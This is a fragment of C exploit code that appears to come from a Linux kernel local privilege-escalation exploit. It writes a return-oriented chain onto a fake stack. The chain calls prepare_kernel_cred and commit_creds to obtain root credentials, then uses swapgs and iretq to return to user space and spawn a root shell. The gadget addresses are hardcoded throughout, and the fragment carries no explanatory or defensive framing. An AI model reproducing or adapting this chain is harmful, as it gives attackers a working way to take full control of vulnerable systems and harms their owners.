save_state();

fake_stack = (unsigned long *)(stack_addr);

*fake_stack ++= 0xffffffff810c9ebdUL; /* pop %rdi; ret */

fake_stack = (unsigned long *)(stack_addr + 0x11e8 + 8);

*fake_stack ++= 0x0UL;                  /* NULL */
*fake_stack ++= 0xffffffff81095430UL;   /* prepare_kernel_cred() */
*fake_stack ++= 0xffffffff810dc796UL;   /* pop %rdx; ret */
*fake_stack ++= 0xffffffff81095196UL;   /* commit_creds() + 2 instructions */
*fake_stack ++= 0xffffffff81036b70UL;   /* mov %rax, %rdi; call %rdx */

*fake_stack ++= 0xffffffff81052804UL;   /* swapgs ; pop rbp ; ret */
*fake_stack ++= 0xdeadbeefUL;           /* dummy placeholder */

*fake_stack ++= 0xffffffff81053056UL;   /* iretq */
*fake_stack ++= (unsigned long)shell;   /* spawn a shell */
*fake_stack ++= user_cs;                /* saved CS */
*fake_stack ++= user_rflags;            /* saved EFLAGS */
*fake_stack ++= (unsigned long)(temp_stack+0x5000000);  /* mmaped stack region in user space */
*fake_stack ++= user_ss;                /* saved SS */
